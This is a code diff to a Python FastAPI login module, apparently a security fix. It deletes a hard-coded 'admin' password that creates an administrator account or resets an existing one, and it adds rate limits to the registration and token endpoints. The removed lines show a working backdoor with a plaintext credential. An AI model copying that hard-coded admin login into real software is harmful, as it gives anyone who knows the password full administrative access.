@@ -48,24 +48,7 @@ def _authenticate_and_issue_token(identifier: str, password: str, db: Session) -
         .filter((UserDB.email == identifier) | (UserDB.username == identifier))
         .first()
     )
-    if identifier == "admin" and password == "Praman!2026":
-        if not user:
-            user = UserDB(
-                id=uuid.uuid4().hex,
-                username="admin",
-                email="admin@praman.gov.in",
-                hashed_password=hash_password("Praman!2026"),
-                full_name="System Administrator",
-                role="admin",
-            )
-            db.add(user)
-            db.commit()
-            db.refresh(user)
-        elif not verify_password(password, user.hashed_password):
-            user.hashed_password = hash_password("Praman!2026")
-            db.commit()
-            db.refresh(user)
-    elif not user or not verify_password(password, user.hashed_password):
+    if not user or not verify_password(password, user.hashed_password):
         raise HTTPException(
             status_code=status.HTTP_401_UNAUTHORIZED,
             detail="Incorrect username/email or password",
@@ -96,7 +79,8 @@ def _authenticate_and_issue_token(identifier: str, password: str, db: Session) -
 
 @router.post("/auth/register", status_code=status.HTTP_201_CREATED)
 @router.post("/api/auth/register", status_code=status.HTTP_201_CREATED)
-def register(req: RegisterRequest, db: Session = Depends(get_db)):
+@limiter.limit("10/minute")
+def register(request: Request, req: RegisterRequest, db: Session = Depends(get_db)):
     identifier = req.email or req.username
     if not identifier:
         raise HTTPException(status_code=400, detail="Username or email is required")
@@ -137,7 +121,8 @@ def register(req: RegisterRequest, db: Session = Depends(get_db)):
 
 @router.post("/auth/token", response_model=LoginResponse)
 @router.post("/api/auth/token", response_model=LoginResponse)
-def token_form(form: OAuth2PasswordRequestForm = Depends(), db: Session = Depends(get_db)):
+@limiter.limit("10/minute")
+def token_form(request: Request, form: OAuth2PasswordRequestForm = Depends(), db: Session = Depends(get_db)):
     return _authenticate_and_issue_token(form.username, form.password, db)
 
 
